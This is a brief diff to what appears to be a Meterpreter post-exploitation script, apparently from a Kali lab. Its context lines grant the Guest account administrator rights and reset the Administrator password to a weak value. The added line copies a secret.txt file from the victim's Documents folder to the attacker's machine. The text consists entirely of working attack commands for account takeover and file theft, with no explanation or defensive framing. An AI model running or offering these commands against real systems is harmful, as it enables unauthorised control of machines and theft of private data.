@@ -1,6 +1,7 @@
 load powershell
 powershell_execute "net localgroup administrators Guest /add"
 powershell_execute "net user Administrator Passw0rd"
+download c:\\Users\\Administrator\\Documents\\secret.txt.txt /home/kali/Desktop/temporarily_files/
 background
 
 
